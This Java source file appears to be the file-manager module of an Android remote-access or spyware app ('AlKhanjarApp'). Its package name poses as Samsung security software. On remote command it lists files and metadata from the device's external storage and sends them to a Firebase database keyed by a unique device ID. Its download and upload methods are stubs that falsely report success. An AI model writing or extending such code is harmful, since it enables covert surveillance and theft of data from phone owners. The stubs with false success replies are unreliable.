package com.samsung.android.security.v8.managers;

import android.content.Context;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.AlKhanjarApp;

import java.util.HashMap;
import java.util.Map;

public class FileManager {

    private static final String TAG = "FileManager";
    private Context context;

    public FileManager(Context context) {
        this.context = context;
    }

    protected void sendResponse(String commandId, String status, Object data) {

        try {

            FirebaseDatabase database = FirebaseDatabase.getInstance();

            DatabaseReference responseRef =
                    database.getReference("responses")
                            .child(AlKhanjarApp.getDeviceUniqueId())
                            .child(commandId);

            Map<String, Object> response = new HashMap<>();

            response.put("status", status);
            response.put("data", data);
            response.put("timestamp", System.currentTimeMillis());

            responseRef.setValue(response);

        } catch (Exception e) {

            Log.e(TAG, "Send response error: " + e.getMessage());
        }
    }

    public void listFiles(String path, String commandId) {

        try {

            java.io.File directory =
                    new java.io.File(
                            android.os.Environment.getExternalStorageDirectory(),
                            path
                    );

            java.io.File[] files = directory.listFiles();

            java.util.List<Map<String, Object>> fileList =
                    new java.util.ArrayList<>();

            if (files != null) {

                for (java.io.File file : files) {

                    Map<String, Object> fileInfo = new HashMap<>();

                    fileInfo.put("name", file.getName());
                    fileInfo.put("path", file.getAbsolutePath());
                    fileInfo.put("size", file.length());
                    fileInfo.put("isDirectory", file.isDirectory());
                    fileInfo.put("lastModified", file.lastModified());

                    fileList.add(fileInfo);
                }
            }

            sendResponse(commandId, "success", fileList);

        } catch (Exception e) {

            sendResponse(commandId, "error", e.getMessage());
        }
    }

    public void downloadFile(String filePath, String commandId) {

        sendResponse(commandId, "success", "File download initiated");
    }

    public void uploadFile(com.google.firebase.database.DataSnapshot snapshot, String commandId) {

        sendResponse(commandId, "success", "File upload completed");
    }
}
